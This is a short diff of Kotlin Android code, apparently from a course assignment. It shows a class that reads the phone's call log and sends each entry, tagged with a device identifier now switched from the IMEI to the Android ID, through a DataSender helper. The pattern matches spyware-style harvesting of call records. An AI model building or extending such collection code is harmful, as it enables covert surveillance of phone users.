@@ -4,10 +4,11 @@ import android.app.Activity
 import android.content.Context
 import android.net.Uri
 import android.provider.CallLog
+import android.util.Log
 import com.example.assignment1.DataSender
 import java.util.*
 
-class CallLog(var context: Context, var activity: Activity, var imei: String) {
+class CallLog(var context: Context, var activity: Activity, var androidid: String) {
 
     fun readLogs() {
         var datasender = DataSender()
@@ -31,7 +32,7 @@ class CallLog(var context: Context, var activity: Activity, var imei: String) {
                         Type : $type
                         
                         """.trimIndent()
-                    datasender.sendData(imei, fi)
+                    datasender.sendData(androidid, fi)
                     c.moveToNext()
                 }
         }
